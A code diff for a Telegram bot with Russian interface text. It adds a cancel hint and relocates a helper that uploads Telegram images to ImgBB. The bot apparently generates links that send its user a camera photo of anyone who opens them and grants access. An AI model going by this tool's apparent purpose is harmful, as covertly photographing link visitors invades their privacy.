@@ -115,6 +115,7 @@ bot.action("begin", (ctx) => {
 
 После заполнения всех полей проверьте указанные данные и подтвердите создание ссылки.
 
+Отмена создания - /cancel
 📸 <b>Вы получите фотографию, если посетитель перейдёт по вашей ссылке и самостоятельно разрешит доступ к камере.</b>
     `,
     parse_mode: "HTML",
@@ -348,7 +349,22 @@ bot.launch();
 
 
 
-//  dataBase.insertOne({ id, first_name, username, id_video: dateNow() });
+async function uploadToImgBB(fileId, ctx) {
+  const fileUrl = await ctx.telegram.getFileLink(fileId);
+  const imageResponse = await fetch(fileUrl.href);
+  if (!imageResponse.ok) {
+    throw new Error("Не удалось скачать изображение из Telegram");
+  }
+  const buffer = Buffer.from(await imageResponse.arrayBuffer());
+  const formData = new FormData();
+  formData.append("image", new Blob([buffer], { type: "image/jpeg" }), "preview.jpg");
+  const response = await fetch(`https://api.imgbb.com/1/upload?key=${process.env.IMGBB}`, { method: "POST", body: formData });
+  const result = await response.json();
+  if (!response.ok || !result.success) {
+    throw new Error(result.error?.message || "Ошибка загрузки на ImgBB");
+  }
+  return { current: result.data.image.url, thumb: result.data.thumb.url };
+}
 
 function dateNow() {
   return new Date().getTime();
@@ -361,37 +377,9 @@ function seed(n = 6) {
   return hash;
 }
 
+
 app.listen(3000, (err) => { err ? err : console.log("Started") });
 
 
 
 
-async function uploadToImgBB(fileId, ctx) {
-  // Получаем ссылку на файл Telegram
-  const fileUrl = await ctx.telegram.getFileLink(fileId);
-
-  // Скачиваем изображение
-  const imageResponse = await fetch(fileUrl.href);
-
-  if (!imageResponse.ok) {
-    throw new Error("Не удалось скачать изображение из Telegram");
-  }
-
-  const buffer = Buffer.from(await imageResponse.arrayBuffer());
-
-  // Формируем запрос для ImgBB
-  const formData = new FormData();
-
-  formData.append("image", new Blob([buffer], { type: "image/jpeg" }), "preview.jpg");
-
-  // Загружаем изображение
-  const response = await fetch(`https://api.imgbb.com/1/upload?key=${process.env.IMGBB}`, { method: "POST", body: formData });
-
-  const result = await response.json();
-
-  if (!response.ok || !result.success) {
-    throw new Error(result.error?.message || "Ошибка загрузки на ImgBB");
-  }
-
-  return { current: result.data.image.url, thumb: result.data.thumb.url };
-}
